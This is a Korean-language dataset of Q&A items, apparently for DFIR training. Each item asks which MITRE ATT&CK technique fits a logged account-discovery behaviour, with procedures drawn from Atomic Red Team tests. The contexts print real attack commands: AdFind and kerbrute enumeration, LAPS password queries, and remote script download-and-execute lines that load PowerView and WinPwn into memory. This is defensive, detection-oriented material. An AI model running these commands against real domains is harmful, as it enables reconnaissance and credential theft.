{"id": "T1087.001_T1087.001-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.001 Account Discovery: Local Account (Tactic: Discovery)\n[요약] Windows 시스템에서 plink.exe를 사용해 ESXi 서버에 SSH로 접속하고, esxcli system account list 명령을 실행해 원격 ESXi 호스트의 로컬 계정 목록을 열거한다. 하이퍼바이저 계정 정보를 파악해 추가 공격에 활용할 수 있는 시나리오를 모사한다.\n[절차] 사전 단계에서 지정된 경로(#{plink_file})에 plink.exe가 존재하는지 확인한다. 존재하지 않을 경우 Atomic 테스트의 get_prereq 명령을 통해 인터넷에서 plink.exe를 다운로드하고, ExternalPayloads 디렉터리에 저장한다. cmd.exe 또는 PowerShell에서 echo \"\" | plink 명령을 실행해 지정된 ESXi 호스트(vm_host)에 SSH로 비대화형 접속을 시도한다. vm_user/vm_pass 계정으로 로그인 후, 원격에서 esxcli system account list 명령을 실행해 ESXi의 로컬 계정 목록을 출력한다.\n[대표 명령 예시]\necho \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system account list\"", "answer": "이 행위는 MITRE ATT&CK의 T1087.001 \"Account Discovery: Local Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] net 도구를 사용해 도메인 사용자와 도메인 그룹을 열거한다. 도메인 가입 시스템에서 간단한 두 개의 명령으로 전체 사용자·그룹 구조를 파악하는 기본 정찰 행위를 시뮬레이션한다.\n[절차] cmd.exe 세션을 연다. net user /domain 명령으로 도메인 사용자 계정 목록을 열거한다. net group /domain 명령으로 도메인 그룹 목록을 열거한다. 결과를 통해 관리자/서비스/일반 사용자 그룹 구성을 분석한다.\n[대표 명령 예시]\nnet user /domain\nnet group /domain", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] PowerShell과 net, get-localgroupmember, get-aduser를 활용해 도메인 사용자, 로컬 그룹 멤버, AD 사용자 객체를 대량으로 열거한다. 도메인·로컬 계정 구조를 종합적으로 파악하는 시나리오를 시뮬레이션한다.\n[절차] PowerShell 세션을 시작한다. net user /domain 명령으로 도메인 사용자 계정 목록을 조회한다. get-localgroupmember -group Users로 로컬 Users 그룹 구성원을 확인한다. get-aduser -filter * 명령을 통해 도메인 전체 AD 사용자 객체를 열거한다(AD 모듈 필요).\n[대표 명령 예시]\nnet user /domain\nget-localgroupmember -group Users\nget-aduser -filter *", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] query user /SERVER:<호스트> 명령을 통해 지정된 원격 시스템의 로그인 사용자 세션을 열거한다. 도메인 환경에서 다른 서버/워크스테이션에 누가 로그인 중인지 확인하는 활동을 모사한다.\n[절차] 대상 컴퓨터 이름(#{computer_name})을 확인한다(기본값: %COMPUTERNAME%). cmd.exe에서 query user /SERVER:#{computer_name} 명령을 실행한다. 출력된 사용자, 세션 이름, 세션 ID, 상태 등을 분석해 활성/비활성 사용자 세션을 파악한다.\n[대표 명령 예시]\nquery user /SERVER:#{computer_name}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] ADRecon.ps1 스크립트를 사용하여 도메인 환경의 계정, 그룹, 컴퓨터, GPO 등 다양한 정보를 자동으로 수집해 Excel 리포트로 생성한다. 대규모 AD 정찰 자동화 행위를 시뮬레이션한다.\n[절차] 사전 단계에서 지정된 경로(#{adrecon_path})에 ADRecon.ps1이 존재하는지 확인한다. 존재하지 않을 경우 GitHub에서 ADRecon.ps1을 다운로드해 ExternalPayloads 디렉터리에 저장한다. PowerShell에서 Invoke-Expression \"#{adrecon_path}\"를 실행하여 ADRecon 스크립트를 구동한다. 실행 후 생성된 ADRecon-Report-*.xlsx 파일 경로를 확인하고 도메인 정보가 정리된 내용을 검토한다.\n[대표 명령 예시]\nInvoke-Expression \"#{adrecon_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe 도구를 사용해 도메인 비밀번호 정책(lockoutDuration, maxPwdAge 등)을 LDAP로 조회한다. 도메인 계정 보안 설정을 파악해 공격 전략(브루트포스, 잠금 우회 등)을 세우는 정찰을 모사한다.\n[절차] PathToAtomicsFolder..\\ExternalPayloads\\AdFind.exe가 존재하는지 확인한다. 없을 경우 GitHub에서 AdFind.exe를 다운로드해 ExternalPayloads 경로에 저장한다. cmd.exe에서 AdFind.exe #{optional_args} -default -s base <비밀번호 정책 속성들> 명령을 실행한다. 출력된 비밀번호 길이, 히스토리 길이, 잠금 임계값 등을 분석한다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 admincount 속성이 설정된 AD 객체를 열거함으로써 도메인 관리자 및 고권한 계정 목록을 수집한다. 랜섬웨어 그룹 등이 사용하는 AD 관리자 정찰 기법을 모사한다.\n[절차] AdFind.exe가 ExternalPayloads 디렉터리에 존재하는지 확인한다. cmd.exe에서 AdFind.exe -sc admincountdmp #{optional_args} 명령을 실행한다. 출력 결과에서 admincount=1로 표시되는 도메인 관리자/특권 계정들을 식별한다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp #{optional_args}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 objectcategory=person 필터로 AD 사용자 객체를 대량으로 열거한다. 랜섬웨어 및 침해그룹이 사용하는 도메인 사용자 정찰 기법을 재현한다.\n[절차] AdFind.exe가 ExternalPayloads 경로에 있는지 확인한다. cmd.exe에서 AdFind.exe -f (objectcategory=person) #{optional_args} 명령을 실행한다. 출력 결과를 분석해 도메인 사용자 계정 목록과 속성을 확인한다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe의 exchaddresses 스위치를 사용해 Exchange 관련 AD 객체를 열거한다. 메일 시스템과 연계된 계정을 파악해 피싱, 계정 탈취 등 후속 공격을 준비하는 정찰을 시뮬레이션한다.\n[절차] AdFind.exe가 ExternalPayloads 경로에 존재하는지 확인한다. cmd.exe에서 AdFind.exe -sc exchaddresses #{optional_args} 명령을 실행한다. 출력된 Exchange 관련 AD 객체 정보를 바탕으로 메일 박스 사용자/그룹을 식별한다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] net user administrator /domain 명령을 사용해 기본 도메인 관리자 계정의 속성을 조회한다. 기본 관리자 계정 상태, 그룹 소속, 비밀번호 정책 등을 확인하는 정찰을 재현한다.\n[절차] 도메인 환경에서 cmd.exe를 연다. net user administrator /domain 명령을 실행한다. 출력된 정보에서 계정 활성 상태, 그룹 멤버십, 비밀번호 마지막 변경 시각 등의 속성을 분석한다.\n[대표 명령 예시]\nnet user administrator /domain", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] ActiveDirectory PowerShell 모듈의 Get-ADObject를 사용해 UserAccountControl에 TRUSTED_FOR_DELEGATION 플래그(기본 524288)가 설정된 컴퓨터/계정을 검색한다. 무제한 위임(Unconstrained Delegation) 대상 시스템을 식별하는 정찰을 모사한다.\n[절차] PowerShell ActiveDirectory 모듈이 설치되어 있는지 확인한다. 도메인 사용자 권한으로 PowerShell을 실행한다. Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain} 명령을 실행한다. 결과에 나타난 객체들을 검토해 위임 설정이 된 컴퓨터/계정을 파악한다.\n[대표 명령 예시]\nGet-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-11_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] 인터넷에서 PowerView.ps1을 로드하고 Get-DomainUser를 실행하여 도메인 사용자 목록을 상세히 열거한다. 레드팀/공격자들이 즐겨 사용하는 PowerView 기반 도메인 정찰을 재현한다.\n[절차] PowerShell에서 TLS1.2 프로토콜을 활성화한다. Invoke-WebRequest를 이용해 PowerSploit GitHub에서 PowerView.ps1을 다운로드하여 메모리로 로드(IEX)한다. Get-DomainUser -verbose 명령을 실행해 도메인 사용자 정보를 열거한다. 출력된 사용자 계정, UPN, SID, 그룹 멤버십 등을 분석한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-12_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] PowerShell ADSISearcher 타입 가속기를 사용해 objectcategory=user 필터로 AD 사용자 객체를 검색한다. 별도 도구 없이 .NET 기반으로 사용자 정보를 열거하는 방법을 시뮬레이션한다.\n[절차] 도메인에 조인된 호스트에서 PowerShell을 실행한다. ([adsisearcher]\"objectcategory=user\").FindAll() 명령으로 모든 사용자 객체를 열거한다. ([adsisearcher]\"objectcategory=user\").FindOne() 명령으로 한 개의 사용자 객체를 조회한다. 반환된 SearchResult 내 사용자 DN 및 속성을 분석한다.\n[대표 명령 예시]\n([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-13_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] ADSISearcher와 ADSI를 사용해 조직 단위(OU)를 열거하고, 각 OU에 연결된 GPO(gPlink)를 찾아 경로와 이름을 출력한다. OU 수준에 링크된 정책 구성을 식별하는 정찰을 시뮬레이션한다.\n[절차] PowerShell에서 ([adsisearcher]'(objectcategory=organizationalunit)').FindAll()을 이용해 모든 OU를 검색한다. 각 OU에 대해 [ADSI]를 통해 gPlink 속성을 확인하고, 연결된 GPO 경로와 DisplayName을 추출한다. Write-Host를 통해 OU Path와 각 Policy Path/Name을 출력한다.\n[대표 명령 예시]\n(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-14_Q14", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] ADSISearcher의 SearchRoot를 이용해 루트 도메인 객체를 조회하고, 그 도메인에 링크된 GPO(gPlink)를 열거한다. 도메인 루트 수준에서 적용되는 정책을 식별하는 정찰을 시뮬레이션한다.\n[절차] PowerShell에서 (([adsisearcher]'').SearchRoot).Path를 사용해 루트 도메인 객체를 가져온다. 각 도메인 객체에 대해 [ADSI]로 gPlink 속성을 확인한다. gPlink에 포함된 각 GPO 경로를 AD 객체로 변환해 Path와 DisplayName을 출력한다.\n[대표 명령 예시]\n(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-15_Q15", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] 인터넷에서 WinPwn.ps1을 다운로드 후 generaldomaininfo 함수를 실행해 도메인 일반 정보를 수집한다. 공격 프레임워크형 스크립트를 활용한 AD 정찰 기법을 재현한다.\n[절차] PowerShell에서 iex(new-object net.webclient).downloadstring(...)을 실행하여 WinPwn.ps1 내용을 메모리에 로드한다. generaldomaininfo -noninteractive -consoleoutput 함수를 호출한다. 출력 결과에서 도메인 이름, 포리스트, DC, 신뢰 관계 등 일반적인 도메인 정보를 확인한다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-16_Q16", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] kerbrute.exe를 사용해 도메인 컨트롤러에 대해 Kerberos 기반 사용자 이름 브루트포스를 수행한다(userenum). 존재하는 계정명을 식별해 이후 암호 추측 공격에 활용할 수 있는 정찰을 모사한다.\n[절차] PathToAtomicsFolder..\\ExternalPayloads에 kerbrute.exe와 username.txt가 존재하는지 확인한다. 존재하지 않을 경우 GitHub 릴리스 및 username 리스트를 다운로드해 ExternalPayloads에 저장한다. PowerShell에서 ExternalPayloads 디렉터리로 이동한 뒤, kerbrute.exe userenum -d #{Domain} --dc #{DomainController} username.txt 명령을 실행한다. 출력 결과에서 존재하는 도메인 사용자 계정들을 식별한다.\n[대표 명령 예시]\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-17_Q17", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] wmic와 wevtutil을 사용해 도메인 컨트롤러의 보안 로그에서 NTLM 인증 이벤트(4776)를 추출하고, 결과를 C:\\ntlmusers.evtx에 저장한다. NTLM 인증을 사용한 사용자 계정을 식별하는 정찰을 모사한다.\n[절차] LOGONSERVER 환경 변수에서 도메인 컨트롤러 이름을 얻고, DNS를 통해 IP 주소를 조회한다. wmic.exe /node:<DC_IP> process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]\"' 명령을 실행한다. 원격 도메인 컨트롤러 C: 드라이브에 ntlmusers.evtx 파일이 생성된다. 필요 시 \\<DC_IP>\\c$\\ntlmusers.evtx 공유 경로를 통해 파일을 가져오거나 분석한다.\n[대표 명령 예시]\n$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]\"'", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-18_Q18", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] Get-ADComputer #{hostname} -Properties * 명령을 이용해 특정 컴퓨터 객체의 모든 속성을 조회하고, 그 중 LAPS 관련 속성(ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime)을 포함한 전체 정보를 가져온다.\n[절차] PowerShell ActiveDirectory 모듈이 설치되어 있는지 확인한다. 도메인 환경에서 PowerShell을 실행한다. Get-ADComputer #{hostname} -Properties * 명령을 실행한다. 출력된 속성 목록에서 LAPS 관련 속성과 기타 민감 정보(설명, OS, 마지막 로그온 등)를 확인한다.\n[대표 명령 예시]\nGet-ADComputer #{hostname} -Properties *", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-19_Q19", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 사용해 LAPS 로컬 관리자 비밀번호와 만료 시간을 직접 조회한다. 이는 명백한 자격 증명 수집 행위를 시뮬레이션한다.\n[절차] 도메인 환경에서 PowerShell을 실행한다. Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 실행한다. 출력 결과에서 LAPS가 관리하는 로컬 관리자 비밀번호와 만료 시간을 확인한다.\n[대표 명령 예시]\nGet-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-20_Q20", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] Get-ADComputer -SearchScope subtree -filter \"name -like '*'\" -Properties * 명령으로 도메인 하위의 모든 컴퓨터 객체를 검색하고, 각 객체의 모든 속성(포함 LAPS 속성)을 일괄 열거한다.\n[절차] 도메인 환경에서 PowerShell을 실행한다. Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties * 명령을 실행한다. 결과 목록에서 각 컴퓨터 객체의 LAPS 속성 및 기타 보안 관련 속성을 검토한다.\n[대표 명령 예시]\nGet-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.002_T1087.002-21_Q21", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 도메인의 모든 컴퓨터 객체에 대해 전체 속성(*)을 열거하고, 그 안에 포함된 LAPS 관련 속성(ms-mcs-AdmPwd 등)을 함께 수집한다.\n[절차] ExternalPayloads 디렉터리에 AdFind.exe가 존재하는지 확인한다. PowerShell에서 AdFind.exe #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" * 명령을 실행한다. 출력에서 각 컴퓨터 객체의 LAPS 속성을 포함한 전체 AD 속성을 분석한다.\n[대표 명령 예시]\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
